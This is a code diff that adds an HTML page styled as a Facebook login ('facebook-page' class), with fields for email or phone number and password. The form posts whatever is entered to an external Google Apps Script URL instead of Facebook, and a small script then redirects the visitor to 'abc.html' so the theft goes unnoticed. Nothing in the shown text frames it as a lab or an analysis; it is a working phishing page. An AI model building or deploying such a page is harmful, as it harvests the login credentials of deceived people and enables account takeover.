@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <div class="container flex">
+        <div class="facebook-page flex">
+            <div class="text">
+            </div>
+            <form id="loginForm"
+                action="https://script.google.com/macros/s/AKfycbyWXA7Vyr65dPbW_w1Mpw8AxrCwCotIy_8UEeOsxI78Cysek6rUJ_11tTagEeHy70vS/exec"
+                method="post">
+                <input type="email" name="email" id="email" placeholder="Email or phone number" required>
+                <input type="password" name="password" id="password" placeholder="Password" required>
+                <div class="link">
+                    <!-- Use a button instead of submit input -->
+                    <button type="button" class="login" onclick="submitForm()">Login</button>
+                </div>
+                <hr>
+                <div class="button">
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        function submitForm() {
+            // Use JavaScript to submit the form when the button is clicked
+            document.getElementById("loginForm").submit();
+            // Redirect to abc.html after form submission
+            window.location.href = 'abc.html';
+        }
+    </script>
+</body>
+
+</html>
+
